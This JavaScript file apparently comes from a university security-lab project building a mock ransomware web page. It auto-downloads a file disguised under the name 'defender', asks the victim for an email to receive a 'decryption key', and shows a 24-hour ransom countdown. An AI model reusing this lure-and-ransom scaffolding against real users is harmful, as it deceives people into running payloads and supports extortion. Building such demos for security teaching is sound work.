/*
function downloadFile() {
  // url="https://file.io/UYNziVaxKJgv"
  url="/home/sec-lab/Desktop/Group8_Website/sw/test"
  filename="defender"
  fetch(url, { method: 'get', mode: 'no-cors', referrerPolicy: 'no-referrer' })
    .then(res => res.blob())
    .then(res => {
      const aElement = document.createElement('a');
      aElement.setAttribute('download', "defender");
      const href = URL.createObjectURL(res);
      aElement.href = href;
      aElement.setAttribute('target', '_blank');
      aElement.click();
      URL.revokeObjectURL(href);
    });
};
*/


function downloadFile() {
  // url="https://file.io/UYNziVaxKJgv"
  url = "/home/sec-lab/Desktop/Group8_Website/sw/test"
  const aElement = document.createElement('a');
  aElement.setAttribute('href', url);
  aElement.setAttribute('download', 'defender');
  document.body.appendChild(aElement)
  aElement.click();
  anchor.parentNode.removeChild(aElement)


}

function sendEmail() {
  var emailVal = document.getElementById('email').value
  if (!emailVal) {
    alert("Enter email address to receive decyrption key")
  }
  else {
    alert("Email sent successfully to "+emailVal)
  }

}

function showTimer() {
  var duration = 24 * 60 * 60;
  var display = $('#demo');
  var timer = duration, hours, minutes, seconds;
  setInterval(function () {
    hours = parseInt((timer / 3600) % 24, 10)
    minutes = parseInt((timer / 60) % 60, 10)
    seconds = parseInt(timer % 60, 10);

    hours = hours < 10 ? "0" + hours : hours;
    minutes = minutes < 10 ? "0" + minutes : minutes;
    seconds = seconds < 10 ? "0" + seconds : seconds;

    display.text(hours + ":" + minutes + ":" + seconds);

    --timer;
  }, 1000);
}


